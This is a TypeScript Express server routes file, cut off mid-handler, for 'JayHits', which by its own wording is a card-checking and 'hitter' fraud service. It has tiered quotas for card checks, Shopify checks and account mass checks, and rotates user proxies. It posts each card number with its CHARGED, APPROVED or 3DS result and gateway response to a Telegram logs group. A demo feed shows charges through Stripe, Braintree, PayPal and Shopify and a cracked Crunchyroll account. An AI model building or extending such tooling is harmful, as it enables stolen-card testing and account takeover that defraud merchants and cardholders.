import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { spawn, execFile } from "child_process";
import * as path from "path";
import * as fs from "fs";
import * as crypto from "crypto";
import { botManager } from "./botManager";
import { saveAllJsonFiles, saveJsonFile } from "./json-persistence";
import { getBooleanConfig, getConfigValue, updateRuntimeSettings } from "./env-config";
import { createPgPoolConfig } from "./pg-config";

// ── Cloudflare helpers ────────────────────────────────────────────────────
// Source: https://www.cloudflare.com/ips/
const CF_IPV4_RANGES = [
  "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
  "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
  "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
  "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
];
const CF_IPV6_PREFIXES = ["2400:cb00","2606:4700","2803:f800","2405:b500","2405:8100","2a06:98c0","2c0f:f248"];

function ipToInt(ip: string): number {
  return ip.split(".").reduce((acc, o) => (acc << 8) + parseInt(o, 10), 0) >>> 0;
}
function isCfIp(ip: string): boolean {
  const clean = ip.replace(/^::ffff:/, "");
  if (clean.includes(":")) return CF_IPV6_PREFIXES.some(p => clean.toLowerCase().startsWith(p));
  const ipInt = ipToInt(clean);
  return CF_IPV4_RANGES.some(cidr => {
    const [base, bits] = cidr.split("/");
    const mask = bits ? (~0 << (32 - parseInt(bits))) >>> 0 : 0xffffffff;
    return (ipToInt(base) & mask) === (ipInt & mask);
  });
}
function isLocalIp(ip: string): boolean {
  const c = ip.replace(/^::ffff:/, "");
  return c === "::1" || c.startsWith("127.") || c.startsWith("10.") || c.startsWith("192.168.") || c === "unknown";
}

/** Always returns the real client IP — prefers Cloudflare header if present. */
function getClientIp(req: Request): string {
  const cfIp = req.headers["cf-connecting-ip"];
  if (cfIp) return Array.isArray(cfIp) ? cfIp[0] : cfIp;
  const xfwd = req.headers["x-forwarded-for"];
  if (xfwd) return (Array.isArray(xfwd) ? xfwd[0] : xfwd).split(",")[0].trim();
  return req.socket?.remoteAddress || "unknown";
}

// ─── In-memory caches ─────────────────────────────────────────────────────────
// These eliminate per-request disk I/O for frequently-read JSON files.
// Write-invalidated caches: updated immediately when the server writes the file.
// TTL-based caches: for files written externally (Python bot), re-read every 60s.

let _userHitterPrefsCache: Record<string, { hide_site: boolean }> | null = null;
let _cfConfigCache: { cfOnly: boolean } | null = null;
let _bannedUsersCache: Set<string> | null = null;
let _bannedUsersCacheAt = 0;
const BANNED_CACHE_TTL = 60_000; // re-read banned list from disk at most every 60s

// Per-user hitter site visibility prefs
const USER_HITTER_PREFS_PATH = path.join(process.cwd(), "bot", "user_hitter_prefs.json");
function getUserHitterPrefs(): Record<string, { hide_site: boolean }> {
  if (_userHitterPrefsCache !== null) return _userHitterPrefsCache;
  try { _userHitterPrefsCache = JSON.parse(fs.readFileSync(USER_HITTER_PREFS_PATH, "utf-8")); }
  catch { _userHitterPrefsCache = {}; }
  return _userHitterPrefsCache!;
}
function saveUserHitterPrefs(prefs: Record<string, { hide_site: boolean }>) {
  _userHitterPrefsCache = prefs;
  fs.writeFileSync(USER_HITTER_PREFS_PATH, JSON.stringify(prefs, null, 2));
}
function getUserSiteVisible(userId: string): boolean {
  const prefs = getUserHitterPrefs();
  if (prefs[userId] !== undefined) return !prefs[userId].hide_site;
  return getBooleanConfig("HITTER_SITE_VISIBLE", true);
}

// CF-only mode config
const CF_CONFIG_PATH = path.join(process.cwd(), "bot", "cf-config.json");
function getCfConfig(): { cfOnly: boolean } {
  if (_cfConfigCache !== null) return _cfConfigCache;
  try { _cfConfigCache = JSON.parse(fs.readFileSync(CF_CONFIG_PATH, "utf-8")); }
  catch { _cfConfigCache = { cfOnly: false }; }
  return _cfConfigCache!;
}
function saveCfConfig(cfg: { cfOnly: boolean }) {
  _cfConfigCache = cfg;
  try { fs.writeFileSync(CF_CONFIG_PATH, JSON.stringify(cfg, null, 2)); } catch {}
}

function sendLogsGroupTelegram(card: string, gateway: string, response: string, status: string, userName: string, userId: string) {
  try {
    const botToken = getConfigValue("TELEGRAM_BOT_TOKEN").trim();
    const logsGroupId = getConfigValue("LOGS_GROUP_ID").trim();
    if (!botToken || !logsGroupId || logsGroupId === "0" || logsGroupId === "") return;
    const s = (status || "").toUpperCase();
    const icon = s === "CHARGED" ? "\uD83D\uDD25" : s === "APPROVED" ? "\u2705" : s === "3DS" ? "\uD83D\uDD10" : "\u274C";
    const label = s === "CHARGED" ? "CHARGED \uD83D\uDD25" : s === "APPROVED" ? "APPROVED \u2705" : s === "3DS" ? "3DS DECLINED \uD83D\uDD10" : "DECLINED \u274C";
    const lines = [
      `${icon} <b>[${label}]</b>`,
      `\uD83D\uDC64 <b>User:</b> ${userName || userId}`,
      `\uD83D\uDCB3 <b>Card:</b> <code>${card}</code>`,
      `\u2194\uFE0F <b>Gateway:</b> ${gateway || ""}`,
      `\uD83D\uDCDD <b>Response:</b> ${response || ""}`,
    ];
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: parseInt(logsGroupId),
        text: lines.join("\n"),
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    }).catch(() => {});
  } catch {}
}

// Module-level proxy cache (lifted from the inner closure to enable caching)
const _userProxiesPath = path.join(path.resolve(process.cwd(), "bot"), "user_proxies.json");
let _userProxiesCache: Record<string, { proxies: string[] }> | null = null;
let _userProxiesCacheAt = 0;
const USER_PROXIES_CACHE_TTL = 20_000; // 20s — picks up Python-side auto-removals quickly
function loadUserProxies(): Record<string, { proxies: string[] }> {
  const now = Date.now();
  if (_userProxiesCache !== null && (now - _userProxiesCacheAt) < USER_PROXIES_CACHE_TTL) return _userProxiesCache;
  try {
    if (fs.existsSync(_userProxiesPath)) {
      _userProxiesCache = JSON.parse(fs.readFileSync(_userProxiesPath, "utf-8"));
      _userProxiesCacheAt = now;
      return _userProxiesCache!;
    }
  } catch {}
  _userProxiesCache = {};
  _userProxiesCacheAt = now;
  return _userProxiesCache;
}
function saveUserProxies(data: Record<string, { proxies: string[] }>) {
  _userProxiesCache = data;
  _userProxiesCacheAt = Date.now();
  fs.writeFileSync(_userProxiesPath, JSON.stringify(data, null, 2));
  saveJsonFile("user_proxies.json").catch(() => {});
  debouncedSaveJson();
}

let saveTimer: ReturnType<typeof setTimeout> | null = null;
function debouncedSaveJson() {
  if (saveTimer) clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    saveAllJsonFiles().catch((err) =>
      console.error("[json-persistence] Debounced save failed:", err.message)
    );
  }, 10000);
}

interface OtpEntry {
  otp: string;
  userId: string;
  expiresAt: number;
  attempts: number;
}

interface ActivityEvent {
  id: string;
  type: "hit" | "login" | "premium" | "account_hit";
  userName: string;
  userId: string;
  message: string;
  detail?: string;
  timestamp: number;
}

const activityLog: ActivityEvent[] = [];
const MAX_ACTIVITY_LOG = 100;

function addActivity(event: Omit<ActivityEvent, "id" | "timestamp">) {
  activityLog.unshift({
    ...event,
    id: crypto.randomBytes(6).toString("hex"),
    timestamp: Date.now(),
  });
  if (activityLog.length > MAX_ACTIVITY_LOG) {
    activityLog.length = MAX_ACTIVITY_LOG;
  }
}

function sendGroupLog(userName: string, userId: string, card: string, gateway: string, response: string, logType: string = "checker", site: string = "", amount: string = "", realSite: string = "") {
  const botDir = path.resolve(process.cwd(), "bot");
  const groupLogScript = path.join(botDir, "web_group_log.py");
  try {
    const proc = spawn("python3", ["-u", groupLogScript, userName, userId, card, gateway, response, logType, site, amount, realSite || site], {
      cwd: botDir,
      env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
      timeout: 15000,
      stdio: "ignore",
    });
    proc.on("error", () => {});
  } catch {}
}

const otpStore = new Map<string, OtpEntry>();

function requireAuth(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.userId) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  next();
}

function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.userId || !req.session?.isAdmin) {
    return res.status(403).json({ message: "Admin access required" });
  }
  // If ADMIN_PIN is configured, the session must have passed PIN verification too
  if (process.env.ADMIN_PIN && !req.session?.adminPinVerified) {
    return res.status(403).json({ message: "Admin PIN required", pinRequired: true });
  }
  next();
}

function isAdminUser(userId: string): boolean {
  const config = botManager.getBotEnvConfig();
  const adminIds = (config.adminId || "").split(",").map((s: string) => s.trim()).filter(Boolean);
  return adminIds.includes(userId);
}

const _usersFilePath = path.resolve(process.cwd(), "bot", "users.json");
let _registeredUsersCache: Set<string> | null = null;
let _registeredUsersCacheAt = 0;
const USERS_CACHE_TTL = 120_000; // re-read users.json at most every 2 minutes
function isRegisteredUser(userId: string): boolean {
  const now = Date.now();
  if (_registeredUsersCache === null || now - _registeredUsersCacheAt > USERS_CACHE_TTL) {
    try {
      if (!fs.existsSync(_usersFilePath)) {
        _registeredUsersCache = new Set();
      } else {
        const data = JSON.parse(fs.readFileSync(_usersFilePath, "utf-8"));
        _registeredUsersCache = new Set(Object.keys(data));
      }
    } catch { _registeredUsersCache = new Set(); }
    _registeredUsersCacheAt = now;
  }
  return _registeredUsersCache.has(userId);
}

function registerTelegramUser(userId: string) {
  let data: Record<string, any> = {};
  try {
    if (fs.existsSync(_usersFilePath)) {
      data = JSON.parse(fs.readFileSync(_usersFilePath, "utf-8"));
    }
  } catch {}

  if (!data[userId]) {
    data[userId] = { joined_at: new Date().toISOString() };
    fs.writeFileSync(_usersFilePath, JSON.stringify(data, null, 2));
    _registeredUsersCache = new Set(Object.keys(data));
    _registeredUsersCacheAt = Date.now();
    saveJsonFile("users.json").catch(() => {});
  }
}

function ensurePersistedUser(userId: string) {
  if (!userId) return;
  if (!isRegisteredUser(userId)) {
    registerTelegramUser(userId);
  }
}

async function sendTelegramMessage(chatId: string | number, text: string, extra: Record<string, unknown> = {}) {
  const token = getConfigValue("TELEGRAM_BOT_TOKEN");
  if (!token) return false;

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: typeof chatId === "string" ? parseInt(chatId, 10) : chatId,
      text,
      ...extra,
    }),
  });

  const data = await response.json() as { ok?: boolean };
  return !!data.ok;
}

type UserTier = "free" | "silver" | "gold";

interface TierEntry {
  tier: UserTier;
  assignedBy: string;
  assignedAt: string;
  expiresAt?: string;
  days?: number;
}

interface TierLimits {
  dailyChecks: number;
  maxBatchCards: number;
  dailyShopifyChecks: number;
  massAccountMax: number;
  dailyFindsiteSearches: number;
  parallelWorkers: number;
  dailyHitterHits: number;
}

const TIER_LIMITS: Record<UserTier, TierLimits> = {
  free: {
    dailyChecks: 500,
    maxBatchCards: 50,
    dailyShopifyChecks: 1000,
    massAccountMax: 1,
    dailyFindsiteSearches: 0,
    parallelWorkers: 1,
    dailyHitterHits: 2,
  },
  silver: {
    dailyChecks: 5000,
    maxBatchCards: 1000,
    dailyShopifyChecks: 10000,
    massAccountMax: 500,
    dailyFindsiteSearches: 3,
    parallelWorkers: 3,
    dailyHitterHits: -1,
  },
  gold: {
    dailyChecks: -1,
    maxBatchCards: 5000,
    dailyShopifyChecks: -1,
    massAccountMax: 1000,
    dailyFindsiteSearches: 10,
    parallelWorkers: 5,
    dailyHitterHits: -1,
  },
};

const bannedUsersFilePath = path.resolve(process.cwd(), "bot", "banned_users.json");

function isUserBanned(userId: string): boolean {
  const now = Date.now();
  if (_bannedUsersCache === null || now - _bannedUsersCacheAt > BANNED_CACHE_TTL) {
    try {
      if (!fs.existsSync(bannedUsersFilePath)) {
        _bannedUsersCache = new Set();
      } else {
        const data = JSON.parse(fs.readFileSync(bannedUsersFilePath, "utf-8"));
        _bannedUsersCache = new Set(Object.keys(data));
      }
    } catch { _bannedUsersCache = new Set(); }
    _bannedUsersCacheAt = now;
  }
  return _bannedUsersCache.has(String(userId));
}

const tierFilePath = path.resolve(process.cwd(), "bot", "user_tiers.json");
let _userTiersCache: Record<string, TierEntry> | null = null;

function loadUserTiers(): Record<string, TierEntry> {
  if (_userTiersCache !== null) return _userTiersCache;
  try {
    if (fs.existsSync(tierFilePath)) {
      _userTiersCache = JSON.parse(fs.readFileSync(tierFilePath, "utf-8"));
      return _userTiersCache!;
    }
  } catch {}
  _userTiersCache = {};
  return _userTiersCache;
}

function saveUserTiers(data: Record<string, TierEntry>) {
  _userTiersCache = data;
  fs.writeFileSync(tierFilePath, JSON.stringify(data, null, 2));
  saveJsonFile("user_tiers.json").catch(() => {});
  debouncedSaveJson();
}

function getUserTier(userId: string): UserTier {
  if (isAdminUser(userId)) return "gold";
  const tiers = loadUserTiers();
  const entry = tiers[userId];
  if (!entry) return "free";
  if (entry.expiresAt) {
    const expiry = new Date(entry.expiresAt).getTime();
    if (Date.now() > expiry) {
      delete tiers[userId];
      saveUserTiers(tiers);
      return "free";
    }
  }
  return entry.tier || "free";
}

function getTierLimits(tier: UserTier): TierLimits {
  return TIER_LIMITS[tier];
}

interface DailyUsageEntry {
  checks: number;
  shopifyChecks: number;
  findsiteSearches: number;
  accountMassChecks: number;
  hitterHits: number;
  date: string;
}

const dailyUsage = new Map<string, DailyUsageEntry>();

const DAILY_USAGE_FILE = path.resolve(process.cwd(), "bot", "daily_usage.json");

function loadDailyUsageFromFile(): void {
  try {
    if (!fs.existsSync(DAILY_USAGE_FILE)) return;
    const raw = JSON.parse(fs.readFileSync(DAILY_USAGE_FILE, "utf-8"));
    const today = new Date().toISOString().slice(0, 10);
    for (const [uid, entry] of Object.entries(raw as Record<string, DailyUsageEntry>)) {
      if (entry && entry.date === today) {
        dailyUsage.set(uid, entry);
      }
    }
  } catch { }
}

function saveDailyUsageToFile(): void {
  try {
    const obj: Record<string, DailyUsageEntry> = {};
    for (const [uid, entry] of dailyUsage.entries()) {
      obj[uid] = entry;
    }
    fs.writeFileSync(DAILY_USAGE_FILE, JSON.stringify(obj, null, 2));
    saveJsonFile("daily_usage.json").catch(() => {});
  } catch { }
}

loadDailyUsageFromFile();

function getTodayStr(): string {
  return new Date().toISOString().slice(0, 10);
}

function getUserDailyUsage(userId: string): DailyUsageEntry {
  const today = getTodayStr();
  let usage = dailyUsage.get(userId);
  if (!usage || usage.date !== today) {
    usage = { checks: 0, shopifyChecks: 0, findsiteSearches: 0, accountMassChecks: 0, hitterHits: 0, date: today };
    dailyUsage.set(userId, usage);
  }
  return usage;
}

function checkDailyLimit(userId: string, type: keyof Omit<DailyUsageEntry, "date">): { allowed: boolean; remaining: number; limit: number; used: number } {
  const tier = getUserTier(userId);
  const limits = getTierLimits(tier);
  const usage = getUserDailyUsage(userId);

  let limit: number;
  let used: number;
  switch (type) {
    case "checks": limit = limits.dailyChecks; used = usage.checks; break;
    case "shopifyChecks": limit = limits.dailyShopifyChecks; used = usage.shopifyChecks; break;
    case "findsiteSearches": limit = limits.dailyFindsiteSearches; used = usage.findsiteSearches; break;
    case "accountMassChecks": limit = limits.massAccountMax; used = usage.accountMassChecks; break;
    case "hitterHits": limit = limits.dailyHitterHits; used = usage.hitterHits; break;
    default: limit = -1; used = 0;
  }

  if (limit === -1) return { allowed: true, remaining: -1, limit: -1, used };
  return { allowed: used < limit, remaining: Math.max(0, limit - used), limit, used };
}

function incrementUsage(userId: string, type: keyof Omit<DailyUsageEntry, "date">, count: number = 1) {
  const usage = getUserDailyUsage(userId);
  usage[type] += count;
  saveDailyUsageToFile();
}

const dailyIpHitterUsage = new Map<string, { count: number; date: string }>();

function checkIpHitterLimit(ip: string): { allowed: boolean; used: number } {
  const today = getTodayStr();
  const entry = dailyIpHitterUsage.get(ip);
  if (!entry || entry.date !== today) return { allowed: true, used: 0 };
  return { allowed: entry.count < 2, used: entry.count };
}

function incrementIpHitterUsage(ip: string) {
  const today = getTodayStr();
  const entry = dailyIpHitterUsage.get(ip);
  if (!entry || entry.date !== today) {
    dailyIpHitterUsage.set(ip, { count: 1, date: today });
  } else {
    entry.count += 1;
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  app.get("/api/healthz", (_req, res) => {
    res.status(200).json({ status: "ok" });
  });

  const otpRateLimit = new Map<string, number>();
  const ipRateLimit = new Map<string, number>();

  // IP → { count, firstAt } — tracks failed OTP verify attempts per IP
  const verifyFailures = new Map<string, { count: number; firstAt: number }>();

  // ── Global API Rate Limiter ───────────────────────────────────────────────
  // Caps any single IP at 120 requests/minute across all /api/* routes.
  // Authenticated admins get a higher cap (300/min) to not throttle the dashboard.
  // This stops rapid polling / scripted enumeration by non-admins.
  const _globalRateWindow = 60_000; // 1 minute
  const _globalRateMap = new Map<string, { count: number; windowStart: number }>();

  app.use("/api", (req: Request, res: Response, next: NextFunction) => {
    const ip = getClientIp(req);
    const isAdminSession = !!(req.session as any)?.adminPinVerified;
    const limit = isAdminSession ? 300 : 120;
    const now = Date.now();
    const bucket = _globalRateMap.get(ip) || { count: 0, windowStart: now };
    if (now - bucket.windowStart > _globalRateWindow) {
      bucket.count = 0;
      bucket.windowStart = now;
    }
    bucket.count++;
    _globalRateMap.set(ip, bucket);
    if (bucket.count > limit) {
      const retryAfter = Math.ceil((_globalRateWindow - (now - bucket.windowStart)) / 1000);
      res.setHeader("Retry-After", String(retryAfter));
      return res.status(429).json({ message: `Rate limit exceeded. Try again in ${retryAfter}s.` });
    }
    next();
  });

  // ── Cloudflare-only mode middleware ───────────────────────────────────────
  // When CF-only is enabled in production, every request whose TCP-layer IP is
  // NOT a Cloudflare edge node is rejected with 403.  Localhost/Replit-internal
  // IPs are always allowed so health-checks and the bot child process still work.
  app.use((req: Request, res: Response, next: NextFunction) => {
    if (process.env.NODE_ENV !== "production") return next();
    const cfg = getCfConfig();
    if (!cfg.cfOnly) return next();
    const remoteIp = req.socket?.remoteAddress || "";
    if (isLocalIp(remoteIp) || isCfIp(remoteIp)) return next();
    return res.status(403).json({ message: "Access via Cloudflare proxy required." });
  });

  /** Reject requests that don't look like they came from the real frontend */
  function requireAppOrigin(req: Request, res: Response): boolean {
    const origin  = req.headers["origin"]  as string | undefined;
    const referer = req.headers["referer"] as string | undefined;
    const host    = req.headers["host"]    as string | undefined;
    // x-forwarded-host is set by the internal api-server proxy and Replit's own proxy
    const fwdHost = (req.headers["x-forwarded-host"] as string | undefined)?.split(",")[0].trim();

    // In development allow any origin so local preview works
    if (process.env.NODE_ENV !== "production") return true;

    // Build the list of allowed origins from both the direct host and the forwarded host
    const hostCandidates = [host, fwdHost].filter(Boolean) as string[];
    const allowed = hostCandidates.flatMap(h => [`https://${h}`, `http://${h}`]);

    const source = origin || referer || "";

    // No origin/referer — block direct API calls
    if (!source) {
      res.status(403).json({ message: "Direct API access not allowed." });
      return false;
    }

    const configuredOrigins = (process.env.ALLOWED_ORIGINS || "")
      .split(",")
      .map((origin) => origin.trim())
      .filter(Boolean);
    if (configuredOrigins.includes(source)) return true;

    const allowVercelOrigins = process.env.ALLOW_VERCEL_ORIGINS !== "false";
    if (allowVercelOrigins && /^https:\/\/[a-z0-9-]+\.vercel\.app$/i.test(source)) return true;

    const configuredOriginRegex = process.env.ALLOWED_ORIGIN_REGEX?.trim();
    if (configuredOriginRegex) {
      try {
        if (new RegExp(configuredOriginRegex).test(source)) return true;
      } catch {
        console.warn("Invalid ALLOWED_ORIGIN_REGEX ignored.");
      }
    }

    if (!allowed.some(a => source.startsWith(a))) {
      res.status(403).json({ message: "Cross-origin API access not allowed." });
      return false;
    }
    return true;
  }

  app.post("/api/auth/request-otp", async (req, res) => {
    if (!requireAppOrigin(req, res)) return;
    let uid = "";
    let ip = "";
    try {
      if (req.session?.userId) {
        return res.status(400).json({ message: "Already authenticated." });
      }

      const { userId } = req.body;
      if (!userId || typeof userId !== "string" || !/^\d{5,15}$/.test(userId.trim())) {
        return res.status(400).json({ message: "Enter a valid Telegram user ID" });
      }

      uid = userId.trim();

      if (isUserBanned(uid)) {
        return res.status(403).json({ message: "You have been banned. Contact the JayHits admin to appeal." });
      }

      ip = getClientIp(req);

      const lastIpRequest = ipRateLimit.get(ip);
      if (lastIpRequest && Date.now() - lastIpRequest < 30000) {
        const wait = Math.ceil((30000 - (Date.now() - lastIpRequest)) / 1000);
        return res.status(429).json({ message: `Please wait ${wait}s before requesting another OTP.` });
      }
      // Reserve the IP slot immediately to block concurrent requests
      ipRateLimit.set(ip, Date.now());

      const lastOtp = otpRateLimit.get(uid);
      if (lastOtp && Date.now() - lastOtp < 60000) {
        ipRateLimit.delete(ip);
        const wait = Math.ceil((60000 - (Date.now() - lastOtp)) / 1000);
        return res.status(429).json({ message: `Please wait ${wait}s before requesting another OTP.` });
      }
      // Reserve the user slot immediately to block concurrent requests
      otpRateLimit.set(uid, Date.now());
      const otp = crypto.randomInt(100000, 999999).toString();
      otpStore.set(uid, {
        otp,
        userId: uid,
        expiresAt: Date.now() + 5 * 60 * 1000,
        attempts: 0,
      });
      const botToken = botManager.getBotEnvConfig().botToken || process.env.TELEGRAM_BOT_TOKEN || "";
      if (!botToken) {
        otpStore.delete(uid);
        otpRateLimit.delete(uid);
        ipRateLimit.delete(ip);
        return res.status(500).json({ message: "Bot token not configured." });
      }

      const otpText =
        `🔐 *Web Login OTP*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `Your verification code:\n\n` +
        `\`${otp}\`\n\n` +
        `⏳ Expires in 5 minutes\n` +
        `⚠️ Do not share this code\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `JayHits Web Login`;

      const tgResp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: parseInt(uid, 10),
          text: otpText,
          parse_mode: "Markdown",
        }),
      });
      const tgData = await tgResp.json() as { ok: boolean; description?: string };

      if (tgData.ok) {
        if (!isRegisteredUser(uid)) {
          registerTelegramUser(uid);
        }
        res.json({ success: true, message: "OTP sent to your Telegram" });
      } else {
        otpStore.delete(uid);
        otpRateLimit.delete(uid);
        ipRateLimit.delete(ip);
        const description = tgData.description || "";
        const needsStart =
          /chat not found|bot was blocked by the user|user is deactivated/i.test(description);
        res.status(needsStart ? 404 : 500).json({
          message: needsStart
            ? "User not found. Start the bot with /start first."
            : (description || "Failed to send OTP. Make sure you've started the bot."),
        });
      }
    } catch (err: any) {
      otpRateLimit.delete(uid);
      ipRateLimit.delete(ip);
      res.status(500).json({ message: "Failed to send OTP. Check if the bot is running." });
    }
  });

  app.post("/api/auth/verify-otp", async (req, res) => {
    if (!requireAppOrigin(req, res)) return;

    const ip = getClientIp(req);

    // IP-level lockout: max 10 failed verify attempts per IP per 15 minutes
    const ipFail = verifyFailures.get(ip) || { count: 0, firstAt: Date.now() };
    if (Date.now() - ipFail.firstAt > 15 * 60 * 1000) {
      // Window expired — reset
      ipFail.count = 0;
      ipFail.firstAt = Date.now();
    }
    if (ipFail.count >= 10) {
      const wait = Math.ceil((15 * 60 * 1000 - (Date.now() - ipFail.firstAt)) / 1000 / 60);
      console.warn(`[auth] verify-otp IP lockout: ${ip} (${ipFail.count} failures)`);
      return res.status(429).json({ message: `Too many failed attempts from your IP. Try again in ${wait} min.` });
    }

    const { userId, otp } = req.body;
    if (!userId || !otp) {
      return res.status(400).json({ message: "Missing userId or OTP" });
    }

    const uid = userId.trim();

    if (isUserBanned(uid)) {
      return res.status(403).json({ message: "You have been banned. Contact the JayHits admin to appeal." });
    }

    const entry = otpStore.get(uid);

    if (!entry) {
      return res.status(400).json({ message: "No OTP requested. Request one first." });
    }

    if (Date.now() > entry.expiresAt) {
      otpStore.delete(uid);
      return res.status(400).json({ message: "OTP expired. Request a new one." });
    }

    entry.attempts++;
    if (entry.attempts > 5) {
      otpStore.delete(uid);
      ipFail.count++;
      verifyFailures.set(ip, ipFail);
      return res.status(429).json({ message: "Too many attempts. Request a new OTP." });
    }

    if (entry.otp !== otp.trim()) {
      ipFail.count++;
      verifyFailures.set(ip, ipFail);
      console.warn(`[auth] Wrong OTP from IP ${ip} for user ${uid} (IP failures: ${ipFail.count})`);
      return res.status(400).json({ message: `Incorrect OTP. ${5 - entry.attempts} attempts remaining.` });
    }

    // Success — clear IP failure counter
    verifyFailures.delete(ip);
    otpStore.delete(uid);
    ensurePersistedUser(uid);
    req.session.userId = uid;
    req.session.isAdmin = isAdminUser(uid);
    req.session.loggedInAt = Date.now();

    try {
      const botDir = path.resolve(process.cwd(), "bot");
      const infoScript = path.join(botDir, "get_user_info.py");
      const infoResult = await new Promise<string>((resolve) => {
        let output = "";
        const proc = spawn("python3", ["-u", infoScript, uid], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 10000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => resolve(output.trim()));
        proc.on("error", () => resolve("{}"));
      });
      const userInfo = JSON.parse(infoResult || "{}");
      req.session.firstName = userInfo.first_name || "";
      req.session.lastName = userInfo.last_name || "";
      req.session.username = userInfo.username || "";
      // Use the locally cached avatar (never expose the raw Telegram token URL)
      req.session.photoUrl = userInfo.photo_saved ? `/api/user/avatar/${uid}` : "";
    } catch {
      req.session.firstName = "";
      req.session.lastName = "";
      req.session.username = "";
      req.session.photoUrl = "";
    }

    const displayName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || uid;
    addActivity({ type: "login", userName: displayName, userId: uid, message: `${displayName} just logged in` });

    req.session.save((saveErr) => {
      if (saveErr) {
        console.error("Session save error:", saveErr);
      }
      res.json({
        success: true,
        user: {
          userId: uid,
          isAdmin: req.session.isAdmin,
          firstName: req.session.firstName || "",
          lastName: req.session.lastName || "",
          username: req.session.username || "",
          photoUrl: req.session.photoUrl || "",
        },
      });
    });
  });

  // ── Admin PIN verification ────────────────────────────────────────────────
  // GET /api/admin/pin-status  — tells the frontend whether a PIN is configured
  // and whether this session has already verified it.
  app.get("/api/admin/pin-status", requireAuth, (req, res) => {
    const pinConfigured = !!process.env.ADMIN_PIN;
    const verified = req.session?.isAdmin && (!pinConfigured || !!req.session?.adminPinVerified);
    res.json({ pinConfigured, verified });
  });

  // POST /api/admin/verify-pin  — submit the admin PIN
  const pinFailures = new Map<string, { count: number; lastAt: number }>();

  app.post("/api/admin/verify-pin", (req, res) => {
    if (!req.session?.userId || !req.session?.isAdmin) {
      return res.status(403).json({ message: "Not an admin account" });
    }
    const ip = getClientIp(req);

    // Brute-force protection: max 5 wrong PINs per IP per 10 min
    const failures = pinFailures.get(ip) || { count: 0, lastAt: 0 };
    if (failures.count >= 5 && Date.now() - failures.lastAt < 10 * 60 * 1000) {
      const wait = Math.ceil((10 * 60 * 1000 - (Date.now() - failures.lastAt)) / 1000);
      return res.status(429).json({ message: `Too many attempts. Try again in ${wait}s.` });
    }

    const { pin } = req.body;
    const correctPin = process.env.ADMIN_PIN;

    if (!correctPin) {
      // No PIN configured — grant access (backwards compatible)
      req.session.adminPinVerified = true;
      return req.session.save(() => res.json({ success: true }));
    }

    if (!pin || pin.toString().trim() !== correctPin.trim()) {
      failures.count++;
      failures.lastAt = Date.now();
      pinFailures.set(ip, failures);
      const remaining = Math.max(0, 5 - failures.count);
      console.warn(`[admin-pin] WRONG PIN from IP ${ip} — ${remaining} attempts left`);
      return res.status(401).json({ message: `Wrong PIN. ${remaining} attempts remaining.` });
    }

    // Correct — clear failure record, mark session as verified
    pinFailures.delete(ip);
    req.session.adminPinVerified = true;
    console.log(`[admin-pin] Admin PIN verified — userId=${req.session.userId} IP=${ip}`);
    req.session.save(() => res.json({ success: true }));
  });

  // POST /api/admin/revoke-sessions — admin can invalidate ALL sessions (nuclear option)
  app.post("/api/admin/revoke-sessions", requireAdmin, async (_req, res) => {
    try {
      const p = (await import("pg")).default;
      const pool = new p.Pool(createPgPoolConfig());
      await pool.query("DELETE FROM user_sessions");
      await pool.end();
      res.json({ success: true, message: "All sessions revoked" });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/activity/recent", requireAdmin, (req, res) => {
    const after = parseInt(req.query.after as string) || 0;
    const events = after > 0 ? activityLog.filter(e => e.timestamp > after) : activityLog.slice(0, 20);
    res.json({ events });
  });

  app.post("/api/activity/demo", requireAdmin, (_req, res) => {
    const demoEvents: Omit<ActivityEvent, "id" | "timestamp">[] = [
      { type: "hit", userName: "Alex", userId: "demo1", message: "Alex Got Hit ⚡", detail: "Charged — Stripe Charge $6" },
      { type: "hit", userName: "Sarah", userId: "demo2", message: "Sarah Got Hit ⚡", detail: "Insufficient Funds — Braintree Auth" },
      { type: "login", userName: "Mike", userId: "demo3", message: "Mike just logged in" },
      { type: "premium", userName: "John", userId: "demo4", message: "John Bought Premium ⭐" },
      { type: "account_hit", userName: "Emma", userId: "demo5", message: "Emma Got Account Hit ⚡", detail: "Crunchyroll — Premium Account" },
      { type: "hit", userName: "Dev", userId: "demo6", message: "Dev Got Hit ⚡", detail: "Charged — Shopify Native" },
      { type: "login", userName: "Lisa", userId: "demo7", message: "Lisa just logged in" },
      { type: "hit", userName: "Omar", userId: "demo8", message: "Omar Got Hit ⚡", detail: "Charged — PayPal Charge $1" },
    ];
    for (let i = 0; i < demoEvents.length; i++) {
      setTimeout(() => addActivity(demoEvents[i]), i * 800);
    }
    res.json({ ok: true, count: demoEvents.length });
  });

  app.post("/api/activity/bot-hit", (req, res) => {
    const secret = req.headers["x-bot-secret"];
    const expectedSecret = process.env.SESSION_SECRET || "";
    if (!expectedSecret || !secret || secret !== expectedSecret) {
      return res.status(403).json({ error: "Forbidden" });
    }
